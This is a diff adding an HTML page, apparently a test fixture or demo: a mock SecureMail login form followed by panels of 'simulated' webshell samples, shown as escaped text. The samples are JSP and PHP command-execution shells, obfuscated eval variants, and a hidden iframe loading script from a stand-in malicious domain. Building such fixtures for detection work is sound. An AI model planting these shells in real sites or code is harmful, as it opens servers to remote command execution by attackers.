@@ -1,0 +1,111 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>SecureMail - Login</title>
+    <style>
+        body {
+            background-color: #eaf0f6;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 50px;
+        }
+        .login-card {
+            max-width: 400px;
+            margin: auto;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        .shell-card {
+            max-width: 800px;
+            margin: 40px auto;
+            border-radius: 8px;
+            background: #1e1e1e;
+            color: #e8e8e8;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+            position: relative;
+        }
+        .shell-title {
+            position: absolute;
+            top: -16px;
+            left: 20px;
+            background: #e74c3c;
+            color: white;
+            font-size: 14px;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        pre {
+            margin: 0;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <h2>Sign in to SecureMail</h2>
+    <form>
+        <label>Email address</label><br>
+        <input type="email" style="width: 100%; padding: 10px;"><br><br>
+        <label>Password</label><br>
+        <input type="password" style="width: 100%; padding: 10px;"><br><br>
+        <button type="submit" style="padding: 10px 20px;">Sign In</button>
+    </form>
+</div>
+
+<!-- Simulated Webshell Payloads -->
+
+<div class="shell-card">
+    <div class="shell-title">🛠 JSP Webshell</div>
+    <pre>&lt;%-- Generic JSP Webshell --%&gt;
+&lt;%@ page import="java.io.*" %&gt;
+&lt;% String cmd = request.getParameter("cmd");
+if(cmd != null) {
+Process p = Runtime.getRuntime().exec(cmd);
+} %&gt;
+    </pre>
+</div>
+
+<div class="shell-card">
+    <div class="shell-title">⚙ PAS Web Kit Shell</div>
+    <pre>&lt;?php
+if ($_POST['pass'] == 'secret') { eval($_POST['cmd']); }
+?&gt;</pre>
+</div>
+
+<div class="shell-card">
+    <div class="shell-title">🧬 FOPO Obfuscation</div>
+    <pre>&lt;?php
+eval(base64_decode("ZXZhbCgkX1BPU1RbJ2NtZCddKTs="));
+?&gt;</pre>
+</div>
+
+<div class="shell-card">
+    <div class="shell-title">🔧 PBot-style Backdoor</div>
+    <pre>&lt;?php
+if(isset($_GET['cmd'])) { system($_GET['cmd']); }
+?&gt;</pre>
+</div>
+
+<div class="shell-card">
+    <div class="shell-title">🎭 Obfuscated Eval</div>
+    <pre>&lt;?php
+$a = "eva"."l"; $a($_REQUEST['cmd']);
+?&gt;</pre>
+</div>
+
+<div class="shell-card">
+    <div class="shell-title">📡 Hidden Iframe Loader</div>
+    <pre>&lt;iframe src="http://malicious-domain.com/evil.js" style="display:none;"&gt;&lt;/iframe&gt;</pre>
+</div>
+
+</body>
+</html>
